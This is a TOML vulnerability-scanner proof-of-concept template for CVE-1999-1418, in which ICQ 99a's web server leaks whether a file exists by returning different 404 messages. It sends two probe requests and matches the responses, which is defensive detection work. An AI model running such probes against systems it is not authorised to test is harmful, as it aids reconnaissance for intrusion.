[info]
author = "ave"
description = "ICQ 99a 内置 Web 服务器（build 1701）在启用 Active Homepage 功能时，对不同文件存在状态返回不同的 404 错误信息（文件存在返回 '404 Forbidden'，文件不存在返回 '404 Not Found'），导致远程攻击者可枚举服务器上敏感文件的存在性。"
id = "POC-AVE-1999-1103"
name = "ICQ 99a Web Server File Existence Information Leakage PoC"
severity = "medium"
tags = [
    "cve-1999-1418",
    "icq",
    "information-disclosure",
]
vuln_id = [
    "CVE-1999-1418",
    "AVE-1999-1103",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/index.html"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["404 Forbidden"]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/nonexistent_file_check"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "404 not found",
    "404 Not Found",
]
